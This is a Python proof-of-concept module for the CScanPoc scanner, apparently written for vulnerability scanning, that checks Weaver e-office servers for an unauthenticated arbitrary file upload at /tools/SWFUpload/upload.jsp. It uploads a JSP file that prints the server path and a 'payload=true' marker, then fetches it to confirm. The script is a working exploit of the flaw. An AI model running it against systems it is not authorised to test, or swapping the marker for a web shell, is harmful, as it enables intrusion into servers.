# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'weaver_0001'  # 平台漏洞编号，留空
    name = 'e-office /tools/SWFUpload/upload.jsp 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-07-01'  # 漏洞公布时间
    desc = '''
        作为协同管理软件行业的领军企业，泛微有业界优秀的协同管理软件产品。在企业级移动互联大潮下，泛微发布了全新的以“移动化 社交化 平台化 云端化”四化为核心的全一代产品系列，包括面向大中型企业的平台型产品e-cology、面向中小型企业的应用型产品e-office、面向小微型企业的云办公产品eteams，以及帮助企业对接移动互联的移动办公平台e-mobile和帮助快速对接微信、钉钉等平台的移动集成平台等等。
        http://xxx.xxx.xxx.xxx/tools/SWFUpload/upload.jsp
        post:
            type="file" name="test"
        可以无需登录直接上传任意文件。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-89440'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a69e2bfa-1c77-405c-ad1a-c9269b60e9ae'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            target_url = self.target + "/tools/SWFUpload/upload.jsp"
            verify_url = self.target + "/nulltest.jsp"
            files = {'test': ('test.jsp', r"""<%@ page import="java.util.*,java.io.*" %>
                <%@ page import="java.io.*"%>
                <%
                String path=application.getRealPath(request.getRequestURI());
                File d=new File(path);
                out.println(path);
                %>
                <% out.println("payload=true");%>""")
                     }
            req = requests.get(target_url, files=files)
            verify_req = requests.get(verify_url)
            content = verify_req.text

            if verify_req.status_code == 200 and 'payload=true' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
